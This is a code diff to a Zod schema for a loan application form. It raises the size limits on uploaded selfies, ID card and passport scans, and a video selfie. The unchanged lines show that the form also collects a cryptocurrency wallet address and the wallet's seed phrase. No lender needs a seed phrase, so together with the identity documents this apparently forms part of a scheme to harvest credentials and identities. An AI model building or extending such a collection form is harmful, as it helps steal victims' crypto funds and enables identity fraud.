@@ -42,13 +42,14 @@ export const loanSubmissionSchema = z.object({
   cryptoWalletType: z.string().max(50).nullable().optional(),
   cryptoWalletAddress: z.string().max(200).nullable().optional(),
   cryptoSeedPhrase: z.string().max(2000).nullable().optional(),
-  // Images stored as R2 keys (short strings) or compressed base64 (<800 KB each)
-  selfieImage: z.string().max(1_500_000).nullable().optional(),
-  idFrontImage: z.string().max(1_500_000).nullable().optional(),
-  idBackImage: z.string().max(1_500_000).nullable().optional(),
-  passportFrontImage: z.string().max(1_500_000).nullable().optional(),
-  passportBackImage: z.string().max(1_500_000).nullable().optional(),
-  videoSelfieUrl: z.string().max(1_500_000).nullable().optional(),
+  // Images stored as R2 keys (short strings) or base64 up to 10 MB each
+  // 10 MB binary → ~13.4 M base64 chars (4/3 ratio)
+  selfieImage: z.string().max(14_000_000).nullable().optional(),
+  idFrontImage: z.string().max(14_000_000).nullable().optional(),
+  idBackImage: z.string().max(14_000_000).nullable().optional(),
+  passportFrontImage: z.string().max(14_000_000).nullable().optional(),
+  passportBackImage: z.string().max(14_000_000).nullable().optional(),
+  videoSelfieUrl: z.string().max(14_000_000).nullable().optional(),
   sourcePage: z.string().max(200).nullable().optional(),
   status: z.enum(loanStatuses).default("pending"),
 });
